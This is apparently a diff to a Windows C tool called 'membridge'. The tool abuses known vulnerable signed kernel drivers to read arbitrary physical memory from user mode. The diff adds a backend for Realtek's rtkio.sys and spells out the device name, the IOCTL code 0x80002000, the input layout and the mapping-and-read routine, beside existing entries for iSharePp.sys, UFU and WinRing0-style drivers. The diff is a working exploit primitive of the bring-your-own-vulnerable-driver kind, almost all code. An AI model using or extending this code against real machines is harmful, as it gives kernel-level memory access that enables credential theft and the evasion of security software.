@@ -24,7 +24,7 @@
 #include <stdlib.h>
 
 typedef enum { BK_CONTROL, BK_FILTER } bind_kind;
-typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP } layout_t;
+typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP } layout_t;
 
 typedef struct {
     const wchar_t *id;
@@ -59,6 +59,9 @@ static const backend_t g_backends[] = {
     { L"isharepp", L"drivers\\isharepp\\iSharePp.sys",
       BK_CONTROL, L"MembridgeIsharepp", L"\\\\.\\iSCSIBoot", LY_WINRING0, 1,
       L"iSharePp.sys (Pnp Driver for iSCSIDisk; OlsApi READ_MEMORY 0x9C406104, arbitrary 64-bit PA)" },
+    { L"rtkio", L"drivers\\rtkio\\rtkio.sys",
+      BK_CONTROL, L"MembridgeRtkio", L"\\\\.\\rtkio", LY_RTKIO_MAP, 1,
+      L"rtkio.sys (Realtek; IOCTL_PHYMEM_MAP 0x80002000: u64 PA + size -> user VA, arbitrary 64-bit PA)" },
     { L"ufu_win10", L"drivers\\ufu\\win10_ufudev64.sys",
       BK_CONTROL, L"MembridgeUfu", L"\\\\.\\UFU", LY_UFU, 0,
       L"win10_ufudev64.sys (IOCTL 0x8010206E, 32-bit PA, 0x1024 bytes)" },
@@ -88,6 +91,7 @@ static const char *layout_name(layout_t l) {
     case LY_UFU: return "ufu";
     case LY_WINRING0: return "winring0";
     case LY_HP_MAP: return "hp_swtools";
+    case LY_RTKIO_MAP: return "rtkio";
     }
     return "?";
 }
@@ -455,6 +459,27 @@ static int read_hp_map(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
     return 1;
 }
 
+// rtkio (Realtek): IOCTL 0x80002000, input 16B {u64 PA; u32 size; u32 pad} -> output user VA (qword).
+static int read_rtkio_map(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
+    uint8_t in[16];
+    uint64_t userVA = 0;
+    DWORD ret = 0;
+    memset(in, 0, sizeof(in));
+    *(uint64_t *)(in + 0) = pa;
+    *(uint32_t *)(in + 8) = size;
+    if (!DeviceIoControl(dev, 0x80002000u, in, sizeof(in), &userVA, sizeof(userVA), &ret, NULL)) {
+        wprintf(L"[ERR] rtkio IOCTL_PHYMEM_MAP err=%lu\n", GetLastError());
+        return 0;
+    }
+    if (userVA == 0) { wprintf(L"[ERR] rtkio returned NULL user VA\n"); return 0; }
+    SIZE_T got = 0;
+    if (!ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)userVA, out, size, &got) || got != size) {
+        wprintf(L"[ERR] rtkio ReadProcessMemory(mapped VA) err=%lu got=%zu\n", GetLastError(), got);
+        return 0;
+    }
+    return 1;
+}
+
 static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uint8_t *out) {
     switch (ly) {
     case LY_CCHWAPI: return read_cchwapi(dev, pa, size, out);
@@ -463,6 +488,7 @@ static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uin
     case LY_UFU: return read_ufu(dev, pa, size, out);
     case LY_WINRING0: return read_winring0(dev, pa, size, out);
     case LY_HP_MAP: return read_hp_map(dev, pa, size, out);
+    case LY_RTKIO_MAP: return read_rtkio_map(dev, pa, size, out);
     }
     return 0;
 }
@@ -504,7 +530,7 @@ static void usage(void) {
     wprintf(L"  membridge --list\n");
     wprintf(L"  membridge --backend <id> --pa <hex> --size <n> [--expect <ascii>] [--dump] [--keep]\n");
     wprintf(L"               [--driver-path <path>] [--no-load]\n");
-    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools>\n");
+    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio>\n");
     wprintf(L"               --pa <hex> --size <n> [--expect <ascii>] [--dump]\n\n");
     wprintf(L"Backends (64-bit PA capable: *):\n");
     for (int i = 0; i < NBACKENDS; i++) {
@@ -552,6 +578,7 @@ int wmain(int argc, wchar_t **argv) {
         else if (_wcsicmp(layout, L"ufu") == 0) g_manual_layout = LY_UFU;
         else if (_wcsicmp(layout, L"winring0") == 0) g_manual_layout = LY_WINRING0;
         else if (_wcsicmp(layout, L"hp_swtools") == 0 || _wcsicmp(layout, L"hp_map") == 0) g_manual_layout = LY_HP_MAP;
+        else if (_wcsicmp(layout, L"rtkio") == 0 || _wcsicmp(layout, L"rtkio_map") == 0) g_manual_layout = LY_RTKIO_MAP;
         else { wprintf(L"[ERR] unknown layout %ls\n", layout); return 6; }
     } else if (backend) {
         for (int i = 0; i < NBACKENDS; i++) {
